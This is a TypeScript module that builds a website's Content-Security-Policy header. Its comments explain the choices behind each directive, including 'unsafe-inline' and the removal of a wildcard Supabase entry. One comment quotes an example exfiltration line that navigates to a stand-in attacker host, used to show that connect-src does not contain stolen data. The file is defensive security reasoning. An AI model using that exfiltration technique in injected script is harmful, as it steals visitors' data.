// Content-Security-Policy for the whole site.
//
// WHY THERE IS NO NONCE HERE — this was built with one first, and measured:
// every page on this site is statically prerendered at build time, so Next
// never gets a per-request render in which to stamp a nonce onto the inline
// hydration scripts. The CSP header went out carrying `nonce-...` and the HTML
// came back with no nonce attribute on any of its 22 script tags, which would
// have blocked hydration outright and taken the WebGL plate and Lenis with it.
// Making it work means `export const dynamic = "force-dynamic"` on every page,
// giving up static rendering and CDN-cached HTML on a page that already ships a
// heavy opening. (The nonce-path advisory that also argued against it,
// GHSA-ffhc-5mcf-pf4q, is patched in the Next 15.5.22 this site now runs —
// static prerendering is the one remaining reason, and it is sufficient.)
//
// So: 'unsafe-inline' on script-src, deliberately. What actually justifies it
// is that there is no injection sink to reach: the site renders no
// user-supplied content anywhere and loads no third-party JS. The one
// dangerouslySetInnerHTML is components/seo/JsonLd.tsx, which serialises
// build-time constants from lib/seo.ts and never touches a request.
//
// What does NOT justify it — and was previously claimed here — is that
// connect-src leaves injected script "nowhere to send anything it steals".
// That argument is wrong twice over. CSP places no restriction on top-level
// navigation, so `location = 'https://evil.example/?d=' + data` exfiltrates
// past any connect-src ever written. And the directive itself used to name a
// wildcard over a multi-tenant host (see the note above buildCsp). connect-src
// raises the cost of a bulk XHR channel; it is not a containment boundary,
// and the case for 'unsafe-inline' has to stand on the absent sink alone.
//
// The rest, checked against the built bundle rather than assumed:
//   script-src   'self' covers the /_next/static chunks (the WebGL plate and
//                Lenis both ship inside them) and Vercel Analytics, which
//                production serves from /_vercel/insights on this origin.
//                No third-party JS is loaded in production, so there is no
//                host allowlist there. Dev adds 'unsafe-eval' for HMR and
//                va.vercel-scripts.com for the analytics debug build;
//                production never gets either.
//   style-src    'unsafe-inline' is unavoidable: the components style a lot of
//                elements with style={{...}} attributes and next/font emits its
//                own inline style block.
//   img-src      blob: and data: because the background draws through a canvas
//                and Next's image loader can hand back blob URLs.
//   media-src    the demo video is served from /public on our own origin.
//   font-src     next/font self-hosts Cormorant Garamond and Manrope at build
//                time, so there is deliberately no fonts.gstatic.com entry.
//   connect-src  'self' only, and nothing else — it carries the Server Action
//                POSTs (waitlist, login, signup) and the first-party analytics
//                beacon. Supabase is deliberately absent; see the note below.

// There is deliberately NO Supabase entry in connect-src.
//
// This directive has been wrong twice. It began as "https://*.supabase.co",
// a wildcard across a multi-tenant host where anyone can register a free
// project and be handed a valid subdomain — allowlisting an exfiltration
// endpoint an attacker can provision for themselves. Pinning it to our own
// project host fixed that but left a subtler problem: nothing in the browser
// talks to Supabase any more. Deleting the browser client made auth entirely
// server-side, so the entry described a capability the site no longer uses.
//
// An allowlist entry that nothing needs is not free — it is a standing
// permission waiting for the first piece of code that wants it, granted in
// advance and unnoticed. 'self' alone is the accurate description of what
// this site actually does, and if client-side Supabase access is ever
// reintroduced the CSP will fail loudly at that moment, which is exactly when
// somebody should be asked to justify it.

/**
 * Vercel Web Analytics' debug script, which is loaded from this host in
 * development ONLY. In production the package serves its script and posts
 * its events under /_vercel/insights on our own origin, so 'self' already
 * covers both and production gains no third-party script host from this.
 */
let VERCEL_ANALYTICS_DEV = "https://va.vercel-scripts.com";

export function buildCsp(isDev: boolean): string
{
  // Next's dev server compiles with eval() and opens a websocket for HMR.
  let scriptSrc = isDev
    ? `'self' 'unsafe-inline' 'unsafe-eval' ${VERCEL_ANALYTICS_DEV}`
    : "'self' 'unsafe-inline'";

  // Dev adds the HMR websocket only.
  let connectSrc = isDev ? "'self' ws: wss:" : "'self'";

  let directives = [
    "default-src 'self'",
    `script-src ${scriptSrc}`,
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' blob: data:",
    "media-src 'self'",
    "font-src 'self'",
    `connect-src ${connectSrc}`,
    "worker-src 'self' blob:",
    "manifest-src 'self'",
    "form-action 'self'",
    "frame-src 'none'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "object-src 'none'",
    "upgrade-insecure-requests",
  ];

  return directives.join("; ");
}
